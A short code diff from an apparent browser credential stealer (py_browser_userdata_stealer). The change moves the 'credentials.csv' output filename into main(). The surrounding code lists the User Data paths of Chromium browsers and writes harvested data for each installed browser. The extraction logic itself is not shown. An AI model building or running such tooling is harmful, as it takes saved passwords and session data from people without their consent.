@@ -7,9 +7,7 @@ import textwrap
 
 from py_browser_userdata_stealer.chromium_based import ChromiumBased
 
-out_file = "credentials.csv"
-
-# Chromium based browser's name, User data path
+# Chromium based browser's name, User Data path
 chromium_based_list = [
     ("Google Chrome", os.path.normpath(os.getenv("LOCALAPPDATA") + 
     "/Google/Chrome/User Data")),
@@ -37,6 +35,7 @@ def main():
     indent = " "*4
     wrapper = textwrap.TextWrapper(initial_indent=indent, subsequent_indent=indent)
 
+    out_file = "credentials.csv"
     with open(out_file, 'w', encoding='utf-8') as f:
         for browser in installed_browsers:
             print(browser.name + ":")
